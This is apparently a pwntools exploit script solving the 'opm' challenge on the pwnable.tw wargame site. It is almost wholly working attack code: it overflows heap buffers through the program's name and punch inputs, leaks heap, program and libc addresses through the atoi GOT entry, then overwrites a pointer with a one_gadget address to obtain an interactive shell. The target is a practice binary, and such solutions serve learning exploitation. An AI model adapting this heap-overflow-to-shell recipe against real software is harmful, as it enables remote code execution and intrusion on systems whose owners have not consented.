## file: exp for opm  ## date: 2018-04-11## author: raycpfrom pwn import *from ctypes import *DEBUG = 1if DEBUG:     p = process('./opm')     #scontext.log_level = 'debug'     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     #libc = ELF('libc_64.so.6')     else:     p = remote('chall.pwnable.tw', 10205, )     libc = ELF('libc_64.so.6')#context.log_level = 'debug'wordSz = 4hwordSz = 2bits = 32PIE = 0mypid=0def leak(address, size):   with open('/proc/%s/mem' % mypid) as mem:      mem.seek(address)      return mem.read(size)def findModuleBase(pid, mem):   name = os.readlink('/proc/%s/exe' % pid)   with open('/proc/%s/maps' % pid) as maps:      for line in maps:         if name in line:            addr = int(line.split('-')[0], 16)            mem.seek(addr)            if mem.read(4) == "\x7fELF":               bitFormat = u8(leak(addr + 4, 1))               if bitFormat == 2:                  global wordSz                  global hwordSz                  global bits                  wordSz = 8                  hwordSz = 4                  bits = 64               return addr   log.failure("Module's base address not found.")   sys.exit(1)def debug(addr):    global mypid    mypid = proc.pidof(p)[0]    #raw_input('debug:')    with open('/proc/%s/mem' % mypid) as mem:        moduleBase = findModuleBase(mypid, mem)        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))def add(Name,Punch):    p.recvuntil('(E)xit\n')    p.sendline('A')    p.recvuntil('Your name:\n')    p.sendline(Name)    p.recvuntil('N punch?\n')    p.sendline(Punch)def show():    p.recvuntil('(E)xit\n')    p.sendline('S')atoi_got=0x0000000000202048def pwn():        ## step 1 leak heap    add('A'*0x70,'0')    #debug(0xC07)    add('B'*0x80+'\x10','1')    add('C'*0x80,'2'+'C'*(0x80-1)+'\x10')    p.recvuntil('<')    p.recvuntil('B'*8)    heap_addr=u64(p.recv(6).ljust(8,'\x00'))    print "heap addr",hex(heap_addr)    heap_base=heap_addr-0x1b0    #debug(0xc8d)    #debug(0xc07)       ## step 2 leak libc    add(p64(heap_base+0x240),'C'*(0x80)+p64(heap_base+0x240+0x30-8))    p.recvuntil('<')    proc_addr=u64(p.recv(6).ljust(8,'\x00'))    proc_base=proc_addr-0xb30    print "proc base",hex(proc_base)    print hex(proc_base+atoi_got)    #debug(0xc07)    add(p64(proc_base+atoi_got),'C'*(0x80)+p64(heap_base+0x2c0-8))    p.recvuntil('<')    atoi_addr=u64(p.recv(6).ljust(8,'\x00'))    libc_base=atoi_addr-libc.symbols['atoi']    system_addr=libc_base+libc.symbols['system']    print "libc base",hex(libc_base)    rce=libc_base+0x4526a    #debug(0xdff)    ## step 3 one_gadget to get shell    add(p64(rce),'C'*(0x80)+p64(heap_base+0x2c0+0x20+0x30))    p.sendline('S')    p.interactive()if __name__ == '__main__':   pwn()     